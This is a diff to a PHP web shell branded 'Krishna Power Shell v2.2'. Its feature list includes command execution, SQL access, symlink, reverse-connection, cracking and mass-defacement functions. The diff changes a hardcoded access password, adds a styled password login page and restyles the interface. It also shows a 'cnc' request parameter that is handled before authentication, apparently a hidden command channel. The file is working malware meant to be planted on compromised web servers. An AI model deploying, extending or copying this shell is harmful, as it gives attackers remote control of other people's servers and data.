@@ -13,7 +13,7 @@ $kk5=array("edit","cmd","del","sql","conf","sym","reverse","crack","mass","logou
 class KrishnaShell{
     public $krishna;
     public $krishna1;
-    public $krishna2='Krishna@Yadav#2099'; #tgchannel
+    public $krishna2='Krishna@Yadav#2015';
     private $krishna3=0;
     private $krishna4="4797450924659018";
     private $krishna5="AES-256-CBC";
@@ -791,25 +791,43 @@ body{
     font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Courier New",monospace;
     background:linear-gradient(135deg,#0a0a0a 0%,#1a0a0a 50%,#0d0b0d 100%);
     min-height:100vh;
+    position:relative;
+}
+body::before{
+    content:"";
+    position:fixed;
+    top:0;
+    left:0;
+    width:100%;
+    height:100%;
+    background-image:url("https://i.pinimg.com/originals/65/02/82/6502826ee4b99b97aaf4b172186dfd86.jpg");
+    background-size:cover;
+    background-position:center;
+    background-repeat:no-repeat;
+    opacity:0.1;
+    z-index:-1;
 }
 .krishna-container{
     max-width:1400px;
     margin:0 auto;
     padding:12px;
+    position:relative;
+    z-index:1;
 }
 .top-image{
     text-align:center;
     margin-bottom:15px;
     border-radius:16px;
     overflow:hidden;
-    box-shadow:0 0 25px rgba(212,175,55,0.25);
+    box-shadow:0 0 25px rgba(212,175,55,0.3);
 }
 .top-image img{
     width:100%;
-    max-height:150px;
-    object-fit:cover;
+    max-height:180px;
+    object-fit:contain;
+    object-position:center;
     border-radius:16px;
-    border:1px solid #D4AF37;
+    background:rgba(0,0,0,0.3);
 }
 .horizontal-menu{
     background:rgba(0,0,0,0.85);
@@ -1087,6 +1105,81 @@ textarea{
     background:#FF6B6B;
     color:#fff;
 }
+.login-page{
+    min-height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    position:relative;
+}
+.login-container{
+    background:rgba(0,0,0,0.85);
+    backdrop-filter:blur(15px);
+    padding:40px;
+    border-radius:25px;
+    border:2px solid #D4AF37;
+    box-shadow:0 0 50px rgba(212,175,55,0.3);
+    width:380px;
+    text-align:center;
+    position:relative;
+    z-index:2;
+}
+.login-container h1{
+    color:#D4AF37;
+    font-size:28px;
+    margin-bottom:10px;
+    letter-spacing:2px;
+}
+.login-container h3{
+    color:#FFD966;
+    font-size:14px;
+    margin-bottom:30px;
+    opacity:0.9;
+}
+.login-container input{
+    width:100%;
+    padding:12px;
+    margin:10px 0;
+    background:rgba(0,0,0,0.7);
+    border:1px solid #D4AF37;
+    border-radius:10px;
+    color:#D4AF37;
+    font-size:16px;
+    outline:none;
+}
+.login-container input:focus{
+    border-color:#FFD700;
+    box-shadow:0 0 10px rgba(212,175,55,0.5);
+}
+.login-container input::placeholder{
+    color:rgba(212,175,55,0.5);
+}
+.login-container button{
+    width:100%;
+    padding:12px;
+    margin-top:20px;
+    background:linear-gradient(135deg,#D4AF37,#B8960C);
+    border:none;
+    border-radius:10px;
+    color:#0a0a0a;
+    font-size:16px;
+    font-weight:bold;
+    cursor:pointer;
+}
+.login-container button:hover{
+    transform:translateY(-2px);
+    box-shadow:0 5px 20px rgba(212,175,55,0.4);
+}
+.login-logo{
+    font-size:60px;
+    margin-bottom:20px;
+    color:#D4AF37;
+}
+.login-footer{
+    margin-top:20px;
+    color:rgba(255,255,255,0.5);
+    font-size:11px;
+}
 @media (max-width:768px){
     .krishna-container{padding:8px;}
     .horizontal-menu a{padding:4px 8px;font-size:10px;}
@@ -1097,8 +1190,10 @@ textarea{
     .th:nth-child(7),.td:nth-child(7){width:85px;}
     .form-row{flex-direction:column;align-items:stretch;}
     .form-row label{min-width:auto;}
-    .top-image img{max-height:100px;}
+    .top-image img{max-height:120px;object-fit:contain;}
     .content-area{padding:10px;}
+    .login-container{width:90%;padding:25px;margin:15px;}
+    .login-container h1{font-size:22px;}
 }
 @media (max-width:480px){
     .horizontal-menu{gap:3px;}
@@ -1157,6 +1252,137 @@ textarea{
         $this->krishna=urldecode($x);
         return$this->k3();
     }
+
+    public function k32(){
+        return'<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>🔱 Krishna Power Shell Login 🔱</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+body{
+    font-family:"Segoe UI",Roboto,"Courier New",monospace;
+    min-height:100vh;
+    background:linear-gradient(135deg,#0a0a0a 0%,#1a0a0a 50%,#0d0b0d 100%);
+    position:relative;
+}
+body::before{
+    content:"";
+    position:fixed;
+    top:0;
+    left:0;
+    width:100%;
+    height:100%;
+    background-image:url("https://i.pinimg.com/originals/65/02/82/6502826ee4b99b97aaf4b172186dfd86.jpg");
+    background-size:cover;
+    background-position:center;
+    background-repeat:no-repeat;
+    opacity:0.15;
+    z-index:0;
+}
+.login-page{
+    min-height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    position:relative;
+    z-index:1;
+}
+.login-container{
+    background:rgba(0,0,0,0.9);
+    backdrop-filter:blur(15px);
+    padding:45px;
+    border-radius:30px;
+    border:2px solid #D4AF37;
+    box-shadow:0 0 60px rgba(212,175,55,0.3);
+    width:400px;
+    text-align:center;
+}
+.login-container h1{
+    color:#D4AF37;
+    font-size:32px;
+    margin-bottom:10px;
+    letter-spacing:3px;
+}
+.login-container h3{
+    color:#FFD966;
+    font-size:14px;
+    margin-bottom:35px;
+    opacity:0.8;
+}
+.login-container input{
+    width:100%;
+    padding:14px;
+    margin:12px 0;
+    background:rgba(0,0,0,0.7);
+    border:1.5px solid #D4AF37;
+    border-radius:12px;
+    color:#D4AF37;
+    font-size:16px;
+    outline:none;
+    transition:all 0.3s;
+}
+.login-container input:focus{
+    border-color:#FFD700;
+    box-shadow:0 0 15px rgba(212,175,55,0.5);
+}
+.login-container input::placeholder{
+    color:rgba(212,175,55,0.5);
+}
+.login-container button{
+    width:100%;
+    padding:14px;
+    margin-top:25px;
+    background:linear-gradient(135deg,#D4AF37,#B8960C);
+    border:none;
+    border-radius:12px;
+    color:#0a0a0a;
+    font-size:18px;
+    font-weight:bold;
+    cursor:pointer;
+    transition:all 0.3s;
+}
+.login-container button:hover{
+    transform:translateY(-3px);
+    box-shadow:0 8px 25px rgba(212,175,55,0.4);
+}
+.login-logo{
+    font-size:70px;
+    margin-bottom:20px;
+    color:#D4AF37;
+}
+.login-footer{
+    margin-top:25px;
+    color:rgba(255,255,255,0.4);
+    font-size:11px;
+}
+@media (max-width:500px){
+    .login-container{width:90%;padding:30px;margin:15px;}
+    .login-container h1{font-size:24px;}
+    .login-logo{font-size:50px;}
+}
+</style>
+</head>
+<body>
+<div class="login-page">
+<div class="login-container">
+<div class="login-logo">🔱</div>
+<h1>KRISHNA POWER SHELL</h1>
+<h3>by Krishna Yadav</h3>
+<form method="POST">
+<input type="password" name="password" placeholder="Enter Password" autocomplete="off">
+<input type="hidden" name="login" value="1">
+<button type="submit">⚡ ENTER SHELL ⚡</button>
+</form>
+<div class="login-footer">Krishna Power Shell v2.2 | Jai Shri Krishna!</div>
+</div>
+</div>
+</body>
+</html>';
+    }
 }
 
 $krishna=new KrishnaShell();
@@ -1168,7 +1394,7 @@ if(!isset($_SESSION['krishna_auth'])||empty($_SESSION['krishna_auth'])){
             header('Location: '.$GLOBALS['kk1'][2]['REQUEST_URI']);
         }
     }else{
-        echo$krishna->k28();
+        echo$krishna->k32();
         if(isset($GLOBALS['kk1'][0]['cnc'])){
             $comex=explode(";",$GLOBALS['kk1'][0]['cnc']);
             if(is_array($comex)&&count($comex)>1){
